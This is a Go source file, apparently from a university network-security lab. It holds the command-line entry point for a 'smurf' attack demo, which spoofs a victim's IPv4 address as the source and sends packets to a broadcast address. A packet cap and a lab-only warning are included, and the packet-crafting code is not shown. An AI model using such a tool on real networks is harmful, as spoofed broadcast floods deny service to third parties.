package main

import (
	"flag"
	"fmt"
	"os"

	"NSSaDS/lab5/internal/usecase"
	"NSSaDS/lab5/pkg/config"
)

func runSmurf(args []string) error {
	fs := flag.NewFlagSet("smurf", flag.ContinueOnError)
	victim := fs.String("victim", "", "victim IPv4 (spoofed source)")
	bcast := fs.String("bcast", "", "IPv4 broadcast destination")
	count := fs.Int("c", config.DefaultSmurfCount, "packets to send (max 5)")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *victim == "" || *bcast == "" {
		return fmt.Errorf("smurf: -victim and -bcast are required")
	}

	cfg := config.New()
	out := usecase.NewPrinter(os.Stdout)
	fmt.Fprintln(os.Stderr, "warning: educational demo on your own lab network only")
	return usecase.NewSmurfer(cfg, out).Run(*victim, *bcast, *count)
}
